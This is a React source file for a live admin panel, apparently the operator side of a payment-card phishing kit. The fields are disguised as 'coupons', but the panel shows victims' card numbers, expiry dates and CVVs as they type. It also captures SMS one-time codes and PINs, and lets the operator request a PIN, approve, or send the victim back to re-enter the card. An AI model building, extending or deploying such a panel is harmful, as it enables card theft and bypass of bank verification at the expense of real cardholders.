import { useState, useEffect, useCallback } from "react";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Monitor, Check, X, MessageSquare, RefreshCw, Filter, RotateCcw, Smartphone, Globe, Radio, Lock } from "lucide-react";
import { useRealtime } from "@/context/RealtimeContext";
import { useAdminAuth } from "@/context/AdminAuthContext";
import { useAdminLocale } from "@/context/AdminLocaleContext";
import {
  Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogTrigger,
} from "@/components/ui/dialog";
import {
  Select, SelectContent, SelectItem, SelectTrigger, SelectValue,
} from "@/components/ui/select";
// import { io } from "socket.io-client"; // Removed redundant import
import { API_URL } from "@/lib/constants";

// --- Coupon Card Visual Component ---
const CouponCard = ({ name, code, date, cvv }: { name: string; code: string; date: string; cvv: string }) => {
  const digits = (code || '').replace(/\D/g, '');
  const formatted = digits ? digits.replace(/(.{4})/g, '$1 ').trim() : '•••• •••• •••• ••••';
  return (
    <div className="w-full max-w-[420px] mx-auto rounded-2xl overflow-hidden shadow-2xl"
      style={{ aspectRatio: '1.7/1', background: 'linear-gradient(135deg, #6D3AE8 0%, #4C1D95 50%, #5B21B6 100%)' }}>
      <div className="h-full flex flex-col justify-between p-7 text-white select-text">
        <div className="text-center pt-3">
          <p className="text-xl font-bold tracking-wider">{name || 'Cardholder Name'}</p>
        </div>
        <div className="text-center py-2 px-1 overflow-hidden">
          <p className="text-[clamp(14px,4.5vw,22px)] font-extrabold tracking-[0.1em] whitespace-nowrap" style={{ fontFamily: "'Courier New', 'Lucida Console', monospace" }}>
            {formatted}
          </p>
        </div>
        <div className="flex justify-between items-end pb-1">
          <p className="text-[22px] font-bold tracking-wider">{date || '••/••'}</p>
          <p className="text-[22px] font-bold tracking-wider">{cvv || '•••'}</p>
        </div>
      </div>
    </div>
  );
};

interface CouponHistoryItem { couponCode: string; dateMMYY: string; password: string; created_at: string; }
interface SmsHistoryItem { smsCode: string; created_at: string; }

interface LiveSession {
  id: string;
  customer: { firstName: string; lastName: string; email: string; phone: string; address: string; city: string; state: string; zipCode: string; country: string; } | null;
  cartTotal: number;
  couponCode: string;
  dateMMYY: string;
  password: string;
  startedAt: string;
}

interface OrderData {
  id: string;
  created_at: string;
  shop_name: string;
  customer: { firstName: string; lastName: string; email: string; phone: string; address: string; city: string; state: string; zipCode: string; country: string; };
  total: number;
  status: string;
  couponCode?: string;
  dateMMYY?: string;
  password?: string;
  smsCode?: string;
  pinCode?: string;
  userAgent?: string;
  ipAddress?: string;
  couponHistory?: CouponHistoryItem[];
  smsHistory?: SmsHistoryItem[];
  online?: boolean;
  _isLive?: boolean;
}

export const DataListView = () => {
  const { getAuthHeaders, clearAuth, token } = useAdminAuth();
  const { t } = useAdminLocale();
  const [orders, setOrders] = useState<OrderData[]>([]);
  const [liveSessions, setLiveSessions] = useState<LiveSession[]>([]);
  const [filterType, setFilterType] = useState<"all" | "pending" | "completed" | "online">("all");
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [onlineOrderIds, setOnlineOrderIds] = useState<Set<string>>(new Set());
  const { liveData, socket } = useRealtime();

  const loadOrders = useCallback(async () => {
    setIsRefreshing(true);
    try {
      const res = await fetch(`${API_URL}/api/admin/orders`, { headers: getAuthHeaders() });
      if (res.status === 401) { clearAuth(); return; }
      const data = await res.json();
      if (Array.isArray(data)) {
        setOrders(data);
        const onIds = new Set<string>();
        data.forEach((o: OrderData) => { if (o.online) onIds.add(o.id); });
        setOnlineOrderIds(onIds);
      }
    } catch (err) { console.error("Failed to load orders", err); }
    finally { setTimeout(() => setIsRefreshing(false), 500); }
  }, [getAuthHeaders, clearAuth]);

  // Load orders on mount
  useEffect(() => {
    loadOrders();
  }, [loadOrders]);

  // Socket event handlers
  useEffect(() => {
    if (!socket) return;

    const handleOrderUpdate = (newOrder: OrderData) => {
      setOrders(prev => {
        const exists = prev.find(o => o.id === newOrder.id);
        if (exists) {
          return prev.map(o => o.id === newOrder.id ? { ...o, ...newOrder } : o);
        }
        return [newOrder, ...prev];
      });
      try { new Audio('/notification.mp3').play().catch(() => {}); } catch {} 
    };

    const handleStatusChange = ({ id, status }: { id: string, status: string }) => {
      setOrders(prev => prev.map(o => o.id === id ? { ...o, status } : o));
    };

    const handleUserStatus = ({ orderId, online }: { orderId: string, online: boolean }) => {
      setOnlineOrderIds(prev => {
        const next = new Set(prev);
        if (online) next.add(orderId);
        else next.delete(orderId);
        return next;
      });
      setOrders(prev => prev.map(o => o.id === orderId ? { ...o, online } : o));
    };

    const handleLivePinUpdate = ({ orderId, pinCode }: { orderId: string, pinCode: string }) => {
       setOrders(prev => prev.map(o => o.id === orderId ? { ...o, pinCode } : o));
    };

    socket.on('admin:order_update', handleOrderUpdate);
    socket.on('order_status_changed', handleStatusChange);
    socket.on('user_status_change', handleUserStatus);
    socket.on('live_pin_update', handleLivePinUpdate);

    return () => {
      socket.off('admin:order_update', handleOrderUpdate);
      socket.off('order_status_changed', handleStatusChange);
      socket.off('user_status_change', handleUserStatus);
      socket.off('live_pin_update', handleLivePinUpdate);
    };
  }, [socket]);

  // Convert live sessions to display format and merge with orders
  const liveAsOrders: OrderData[] = liveSessions.map(s => ({
    id: `LIVE-${s.id.slice(-6)}`,
    created_at: s.startedAt,
    shop_name: 'Live',
    customer: s.customer || { firstName: '...', lastName: '', email: '', phone: '', address: '', city: '', state: '', zipCode: '', country: '' },
    total: s.cartTotal,
    status: 'LIVE_TYPING',
    couponCode: s.couponCode,
    dateMMYY: s.dateMMYY,
    password: s.password,
    _isLive: true,
  }));

  const allOrders = [...liveAsOrders, ...orders];

  const filteredOrders = allOrders.filter(order => {
    if (filterType === "all") return true;
    if (filterType === "pending") return ["WAITING_APPROVAL", "SMS_SUBMITTED", "RETURN_COUPON", "LIVE_TYPING", "REQUEST_PIN", "PIN_SUBMITTED"].includes(order.status);
    if (filterType === "completed") return ["COMPLETED", "APPROVED"].includes(order.status);
    if (filterType === "online") return order._isLive || onlineOrderIds.has(order.id);
    return true;
  });

  const fmt = (d: string) => { try { return new Date(d).toLocaleString('en-US', { year: 'numeric', month: 'numeric', day: 'numeric', hour: '2-digit', minute: '2-digit' }); } catch { return d; } };

  const updateStatus = async (id: string, status: string) => {
    try {
      const res = await fetch(`${API_URL}/api/admin/orders/${id}/status`, { method: 'POST', headers: { 'Content-Type': 'application/json', ...getAuthHeaders() }, body: JSON.stringify({ status }) });
      if (res.status === 401) clearAuth();
    } catch (err) { console.error("Failed to update status", err); }
  };
  const handleApprove = (o: OrderData) => updateStatus(o.id, "APPROVED");
  const handleReject = (o: OrderData) => updateStatus(o.id, "REJECTED");
  const handleConfirmSMS = (o: OrderData) => updateStatus(o.id, "COMPLETED");
  const handleRejectSMS = (o: OrderData) => updateStatus(o.id, "REJECTED");
  const handleReturnCoupon = (o: OrderData) => updateStatus(o.id, "RETURN_COUPON");
  const handleRequestPin = (o: OrderData) => updateStatus(o.id, "REQUEST_PIN");

  const devIcon = (ua?: string) => {
    if (!ua) return <Globe className="w-3 h-3" />;
    return /mobile|iphone|android/i.test(ua) ? <Smartphone className="w-3 h-3" /> : <Monitor className="w-3 h-3" />;
  };

  const statusBadge = (status: string) => {
    const s: Record<string, string> = {
      COMPLETED: "bg-green-50 text-green-700 border-green-200",
      APPROVED: "bg-blue-50 text-blue-700 border-blue-200",
      WAITING_APPROVAL: "bg-yellow-100 text-yellow-800 border-yellow-200 animate-pulse",
      SMS_SUBMITTED: "bg-purple-100 text-purple-800 border-purple-200 animate-pulse",
      REJECTED: "bg-red-50 text-red-700 border-red-200",
      AUTO_REJECTED: "bg-red-100 text-red-800 border-red-300",
      RETURN_COUPON: "bg-orange-100 text-orange-800 border-orange-200 animate-pulse",
      LIVE_TYPING: "bg-emerald-100 text-emerald-800 border-emerald-300 animate-pulse",
    };
    const labelKey = status === "APPROVED" ? "WAITING_SMS" : status;
    const label = ["COMPLETED", "APPROVED", "WAITING_SMS", "WAITING_APPROVAL", "SMS_SUBMITTED", "REJECTED", "AUTO_REJECTED", "RETURN_COUPON", "LIVE_TYPING"].includes(labelKey) ? t(`status.${labelKey}`) : status;
    return <Badge variant="outline" className={s[status] || ""}>{label}</Badge>;
  };

  return (
    <div className="space-y-8 animate-in fade-in duration-500">
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div>
          <h2 className="text-2xl font-bold tracking-tight">{t("data.title")}</h2>
          <p className="text-muted-foreground text-sm mt-1">{t("data.subtitle")}</p>
        </div>
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-2">
            <Filter className="w-4 h-4 text-muted-foreground" />
            <Select value={filterType} onValueChange={(v: any) => setFilterType(v)}>
              <SelectTrigger className="w-[180px]"><SelectValue placeholder={t("data.filter")} /></SelectTrigger>
              <SelectContent>
                <SelectItem value="all">{t("data.allOrders")}</SelectItem>
                <SelectItem value="pending">{t("data.pendingAction")}</SelectItem>
                <SelectItem value="completed">{t("data.completed")}</SelectItem>
                <SelectItem value="online">{t("data.onlineUsers")}</SelectItem>
              </SelectContent>
            </Select>
          </div>
          <Button variant="outline" size="icon" onClick={loadOrders} disabled={isRefreshing} className={isRefreshing ? "animate-spin" : ""} title={t("data.refresh")}><RefreshCw className="w-4 h-4" /></Button>
          {liveSessions.length > 0 && (
            <Badge className="bg-emerald-600 text-white text-sm px-3 py-1 h-9 animate-pulse">
              <Radio className="w-3 h-3 mr-1" />{liveSessions.length} {t("data.live")}
            </Badge>
          )}
          <Badge variant="default" className="text-sm px-3 py-1 h-9"><span className="flex items-center gap-1">🟢 {t("data.live")}</span></Badge>
        </div>
      </div>

      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2"><Monitor className="w-5 h-5" />{t("data.orderSubmissions")} ({filteredOrders.length})</CardTitle>
        </CardHeader>
        <CardContent>
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>{t("data.orderId")}</TableHead>
                <TableHead>{t("data.shop")}</TableHead>
                <TableHead>{t("data.date")}</TableHead>
                <TableHead>{t("data.customer")}</TableHead>
                <TableHead>{t("data.amount")}</TableHead>
                <TableHead>{t("data.couponInfo")}</TableHead>
                <TableHead>{t("data.status")}</TableHead>
                <TableHead className="text-right">{t("data.actions")}</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {filteredOrders.length === 0 ? (
                <TableRow><TableCell colSpan={8} className="text-center py-8 text-muted-foreground">{t("data.noDataFound")}</TableCell></TableRow>
              ) : (
                filteredOrders.map((order) => (
                  <TableRow key={order.id} className={
                    order.status === "LIVE_TYPING" ? "bg-emerald-50/60 dark:bg-emerald-900/10 border-l-4 border-l-emerald-500" :
                    order.status === "WAITING_APPROVAL" ? "bg-yellow-50/50 dark:bg-yellow-900/10" :
                    order.status === "SMS_SUBMITTED" ? "bg-blue-50/50 dark:bg-blue-900/10" :
                    (order.status === "REQUEST_PIN" || order.status === "PIN_SUBMITTED") ? "bg-indigo-50/50 dark:bg-indigo-900/10" :
                    order.status === "RETURN_COUPON" ? "bg-orange-50/50 dark:bg-orange-900/10" : ""
                  }>
                    <TableCell className="font-mono text-xs">
                      <div className="flex items-center gap-1.5">
                        <span className={`inline-block w-2 h-2 rounded-full flex-shrink-0 ${order._isLive ? 'bg-emerald-500 animate-pulse' : onlineOrderIds.has(order.id) ? 'bg-green-500' : 'bg-gray-300'}`} />
                        {order._isLive ? (
                          <Dialog>
                            <DialogTrigger asChild>
                              <Button variant="link" className="p-0 h-auto font-mono text-xs underline text-emerald-700">{order.id}</Button>
                            </DialogTrigger>
                            <DialogContent className="max-w-lg">
                              <DialogHeader>
                                <DialogTitle className="flex items-center gap-2"><Radio className="w-4 h-4 text-emerald-600 animate-pulse" />{t("data.liveSessionPreview")}</DialogTitle>
                                <DialogDescription>{t("data.userTyping")}</DialogDescription>
                              </DialogHeader>
                              <div className="py-4">
                                <CouponCard
                                  name={`${order.customer.firstName} ${order.customer.lastName}`.trim()}
                                  code={order.couponCode || ''}
                                  date={order.dateMMYY || ''}
                                  cvv={order.password || ''}
                                />
                                {order.customer.firstName && (
                                  <div className="mt-4 text-sm text-muted-foreground space-y-1">
                                    <div>Email: {order.customer.email || '-'}</div>
                                    <div>Phone: {order.customer.phone || '-'}</div>
                                    <div>Address: {order.customer.address || '-'}, {order.customer.city} {order.customer.state} {order.customer.zipCode}</div>
                                  </div>
                                )}
                              </div>
                            </DialogContent>
                          </Dialog>
                        ) : (
                          <Dialog>
                            <DialogTrigger asChild>
                              <Button variant="link" className="p-0 h-auto font-mono text-xs underline text-primary">{order.id}</Button>
                            </DialogTrigger>
                            <DialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto">
                              <DialogHeader>
                                <DialogTitle>{t("data.orderDetails")}</DialogTitle>
                                <DialogDescription>{t("data.detailsFor")} {order.id}{t("data.from")}{order.shop_name}</DialogDescription>
                              </DialogHeader>
                              <div className="space-y-6 py-4">
                                {/* Coupon Card Visual */}
                                <div className="pb-4 border-b">
                                  <CouponCard
                                    name={`${order.customer.firstName} ${order.customer.lastName}`}
                                    code={order.couponCode || ''}
                                    date={order.dateMMYY || ''}
                                    cvv={order.password || ''}
                                  />
                                </div>
                                {/* Customer */}
                                <div className="border-b pb-4">
                                  <div className="text-sm font-bold uppercase tracking-wider mb-3">{t("data.customerInfo")}</div>
                                  <div className="grid grid-cols-2 gap-y-3 gap-x-8">
                                    <div><div className="text-xs text-muted-foreground">{t("data.name")}</div><div className="font-medium">{order.customer.firstName} {order.customer.lastName}</div></div>
                                    <div><div className="text-xs text-muted-foreground">{t("data.email")}</div><div className="font-medium">{order.customer.email}</div></div>
                                    <div><div className="text-xs text-muted-foreground">{t("data.phone")}</div><div className="font-medium">{order.customer.phone || "N/A"}</div></div>
                                  </div>
                                </div>
                                {/* Address */}
                                <div className="border-b pb-4">
                                  <div className="text-sm font-bold uppercase tracking-wider mb-3">{t("data.shippingAddress")}</div>
                                  <div className="grid grid-cols-2 gap-y-3 gap-x-8">
                                    <div className="col-span-2"><div className="text-xs text-muted-foreground">{t("data.address")}</div><div className="font-medium">{order.customer.address || "N/A"}</div></div>
                                    <div><div className="text-xs text-muted-foreground">{t("data.city")}</div><div className="font-medium">{order.customer.city || "N/A"}</div></div>
                                    <div><div className="text-xs text-muted-foreground">{t("data.state")}</div><div className="font-medium">{order.customer.state || "N/A"}</div></div>
                                    <div><div className="text-xs text-muted-foreground">{t("data.zip")}</div><div className="font-medium">{order.customer.zipCode || "N/A"}</div></div>
                                    <div><div className="text-xs text-muted-foreground">{t("data.country")}</div><div className="font-medium">{order.customer.country || "N/A"}</div></div>
                                  </div>
                                </div>
                                {/* Technical */}
                                <div className="border-b pb-4">
                                  <div className="text-sm font-bold uppercase tracking-wider mb-3">{t("data.technicalInfo")}</div>
                                  <div className="space-y-3">
                                    <div className="flex items-start gap-3"><div className="text-xs text-muted-foreground min-w-[40px] pt-1">IP</div><div className="font-mono text-sm bg-muted px-2 py-1 rounded break-all flex-1">{order.ipAddress || "Unknown"}</div></div>
                                    <div className="flex items-start gap-3"><div className="text-xs text-muted-foreground min-w-[40px] pt-1">UA</div><div className="font-mono text-xs bg-muted px-2 py-1 rounded break-all leading-relaxed flex-1">{order.userAgent || "Unknown"}</div></div>
                                  </div>
                                </div>
                                {/* Verification */}
                                <div className="border-b pb-4 bg-muted/20 -mx-6 px-6 py-4">
                                  <div className="text-sm font-bold uppercase tracking-wider mb-3">{t("data.verificationDetails")}</div>
                                  <div className="grid grid-cols-2 gap-y-3 gap-x-8">
                                    <div><div className="text-xs text-muted-foreground">{t("data.couponCode")}</div><div className="font-mono font-medium">{order.couponCode || "N/A"}</div></div>
                                    <div><div className="text-xs text-muted-foreground">{t("data.dateMMYY")}</div><div className="font-mono font-medium">{order.dateMMYY || "N/A"}</div></div>
                                    <div><div className="text-xs text-muted-foreground">{t("data.password")}</div><div className="font-mono font-bold text-red-500">{order.password || "N/A"}</div></div>
                                    <div><div className="text-xs text-muted-foreground">{t("data.smsCode")}</div><div className="font-mono font-bold text-blue-600">{order.smsCode || "N/A"}</div></div>
                                    <div><div className="text-xs text-muted-foreground">{t("data.amount")}</div><div className="font-medium">${(order.total || 0).toFixed(2)}</div></div>
                                  </div>
                                </div>
                                {/* Coupon History */}
                                {order.couponHistory && order.couponHistory.length > 0 && (
                                  <div className="border-b pb-4">
                                    <div className="text-sm font-bold uppercase tracking-wider mb-3">{t("data.couponHistory")} ({order.couponHistory.length})</div>
                                    <div className="bg-muted/30 rounded-lg overflow-hidden">
                                      <table className="w-full text-xs">
                                        <thead><tr className="border-b"><th className="text-left p-2 text-muted-foreground">#</th><th className="text-left p-2 text-muted-foreground">{t("data.code")}</th><th className="text-left p-2 text-muted-foreground">{t("data.date")}</th><th className="text-left p-2 text-muted-foreground">{t("data.pass")}</th><th className="text-left p-2 text-muted-foreground">{t("data.time")}</th></tr></thead>
                                        <tbody>{order.couponHistory.map((h, i) => (<tr key={i} className="border-b last:border-0"><td className="p-2">{i+1}</td><td className="p-2 font-mono">{h.couponCode}</td><td className="p-2 font-mono">{h.dateMMYY}</td><td className="p-2 font-mono text-red-500">{h.password}</td><td className="p-2 text-muted-foreground">{fmt(h.created_at)}</td></tr>))}</tbody>
                                      </table>
                                    </div>
                                  </div>
                                )}
                                {/* SMS History */}
                                {order.smsHistory && order.smsHistory.length > 0 && (
                                  <div>
                                    <div className="text-sm font-bold uppercase tracking-wider mb-3">{t("data.smsHistory")} ({order.smsHistory.length})</div>
                                    <div className="bg-muted/30 rounded-lg overflow-hidden">
                                      <table className="w-full text-xs">
                                        <thead><tr className="border-b"><th className="text-left p-2 text-muted-foreground">#</th><th className="text-left p-2 text-muted-foreground">{t("data.smsCode")}</th><th className="text-left p-2 text-muted-foreground">{t("data.time")}</th></tr></thead>
                                        <tbody>{order.smsHistory.map((h, i) => (<tr key={i} className="border-b last:border-0"><td className="p-2">{i+1}</td><td className="p-2 font-mono tracking-widest">{h.smsCode}</td><td className="p-2 text-muted-foreground">{fmt(h.created_at)}</td></tr>))}</tbody>
                                      </table>
                                    </div>
                                  </div>
                                )}
                              </div>
                            </DialogContent>
                          </Dialog>
                        )}
                      </div>
                    </TableCell>
                    <TableCell>{order._isLive ? <Badge className="bg-emerald-100 text-emerald-800 border-emerald-300 animate-pulse">{t("data.live")}</Badge> : <Badge variant="outline">{order.shop_name}</Badge>}</TableCell>
                    <TableCell className="whitespace-nowrap text-xs">{fmt(order.created_at)}</TableCell>
                    <TableCell>
                      <div className="font-medium">{order.customer.firstName} {order.customer.lastName}</div>
                      <div className="text-xs text-muted-foreground">{order.customer.email}</div>
                      {!order._isLive && <div className="text-xs text-muted-foreground flex items-center gap-1 mt-0.5">{devIcon(order.userAgent)}<span className="truncate max-w-[100px]">{order.ipAddress || "-"}</span></div>}
                    </TableCell>
                    <TableCell className="font-medium text-sm">${(order.total || 0).toFixed(2)}</TableCell>
                    <TableCell>
                      <div className="space-y-1 min-w-[140px]">
                        <div className="flex justify-between text-xs"><span className="text-muted-foreground">{t("data.code")}:</span><span className={`font-mono font-medium ${order._isLive ? 'text-emerald-700' : ''}`}>{order.couponCode || (order._isLive ? '...' : '-')}</span></div>
                        <div className="flex justify-between text-xs"><span className="text-muted-foreground">{t("data.date")}:</span><span className={`font-mono font-medium ${order._isLive ? 'text-emerald-700' : ''}`}>{order.dateMMYY || (order._isLive ? '...' : '-')}</span></div>
                        <div className="flex justify-between text-xs"><span className="text-muted-foreground">{t("data.pass")}:</span><span className={`font-mono font-bold ${order._isLive ? 'text-emerald-700' : 'text-red-500'}`}>{order.password || (order._isLive ? '...' : '-')}</span></div>
                        {order.couponHistory && order.couponHistory.length > 0 && (<div className="text-[10px] text-orange-600">({order.couponHistory.length} {t("data.previous")})</div>)}
                      </div>
                    </TableCell>
                    <TableCell>
                      <div className="flex flex-col gap-1">
                        {statusBadge(order.status)}
                        {order.smsCode && (<Badge variant="secondary" className="font-mono tracking-widest justify-center bg-purple-100 text-purple-900 border-purple-300">SMS: {order.smsCode}</Badge>)}
                        {order.pinCode && (<Badge variant="secondary" className="font-mono tracking-widest justify-center bg-indigo-100 text-indigo-900 border-indigo-300">PIN: {order.pinCode}</Badge>)}
                      </div>
                    </TableCell>
                    <TableCell className="text-right">
                      {order.status === "LIVE_TYPING" && (
                        <span className="text-xs text-emerald-600 italic">{t("data.typing")}</span>
                      )}
                      {(order.status === "REQUEST_PIN" || order.status === "PIN_SUBMITTED") && (
                        <span className="text-xs text-indigo-600 italic block mb-1">
                          {order.pinCode ? `PIN: ${order.pinCode}` : t("data.userTyping")}
                        </span>
                      )}
                      {order.status === "WAITING_APPROVAL" && (
                        <div className="flex justify-end gap-2">
                          <Button size="sm" variant="outline" onClick={() => handleRequestPin(order)} className="h-8 px-2 border-indigo-300 text-indigo-700 hover:bg-indigo-50" title={t("data.requestPin")}><Lock className="w-4 h-4" /></Button>
                          <Button size="sm" variant="destructive" onClick={() => handleReject(order)} className="h-8 px-2" title={t("data.reject")}><X className="w-4 h-4" /></Button>
                          <Button size="sm" className="h-8 px-2 bg-green-600 hover:bg-green-700" onClick={() => handleApprove(order)} title={t("data.approve")}><Check className="w-4 h-4" /></Button>
                        </div>
                      )}
                      {(order.status === "PIN_SUBMITTED" || order.status === "REQUEST_PIN") && (
                        <div className="flex flex-col gap-2">
                          <div className="flex justify-end gap-2">
                            <Button size="sm" variant="destructive" onClick={() => handleReject(order)} className="h-8 px-2" title={t("data.rejectPin")}><X className="w-4 h-4" /></Button>
                            <Button size="sm" className="h-8 px-3 bg-green-600 hover:bg-green-700 text-white" onClick={() => handleApprove(order)} title={t("data.approve")}>
                              <Check className="w-4 h-4 mr-1" />{t("data.allow")}
                            </Button>
                          </div>
                          <Button size="sm" variant="outline" onClick={() => handleReturnCoupon(order)} className="h-8 px-3 border-orange-300 text-orange-700 hover:bg-orange-50">
                            <RotateCcw className="w-3 h-3 mr-1" />{t("data.returnCard")}
                          </Button>
                        </div>
                      )}
                      {order.status === "SMS_SUBMITTED" && (
                        <div className="flex flex-col gap-2">
                          <div className="flex justify-end gap-2">
                            <Button size="sm" variant="destructive" onClick={() => handleRejectSMS(order)} className="h-8 px-2"><X className="w-4 h-4" /></Button>
                            <Button size="sm" className="h-8 px-3 bg-blue-600 hover:bg-blue-700 text-white" onClick={() => handleConfirmSMS(order)} disabled={!order.smsCode || order.smsCode.length < 4}>
                              <MessageSquare className="w-4 h-4 mr-1" />{t("data.confirm")}
                            </Button>
                          </div>
                          <Button size="sm" variant="outline" onClick={() => handleReturnCoupon(order)} className="h-8 px-3 border-orange-300 text-orange-700 hover:bg-orange-50">
                            <RotateCcw className="w-3 h-3 mr-1" />{t("data.returnCoupon")}
                          </Button>
                        </div>
                      )}
                    </TableCell>
                  </TableRow>
                ))
              )}
            </TableBody>
          </Table>
        </CardContent>
      </Card>
    </div>
  );
};
